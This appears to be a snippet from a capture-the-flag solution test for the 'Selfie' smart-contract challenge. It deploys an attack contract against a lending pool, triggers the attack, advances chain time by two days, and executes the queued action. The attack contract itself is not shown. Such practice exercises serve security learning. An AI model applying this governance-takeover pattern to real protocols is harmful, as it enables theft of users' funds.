...
describe('[Challenge] Selfie', function () {
  ...
  it('Exploit', async function () {
    ...
    const selfieAttack = await SelfieAttackFactory.deploy(this.pool.address)
    await selfieAttack.deployed()

    await selfieAttack.attack().then(tx => tx.wait())
    await ethers.provider.send('evm_increaseTime', [2 * 24 * 60 * 60]) // 2 days
    await selfieAttack.execute().then(tx => tx.wait())
  })
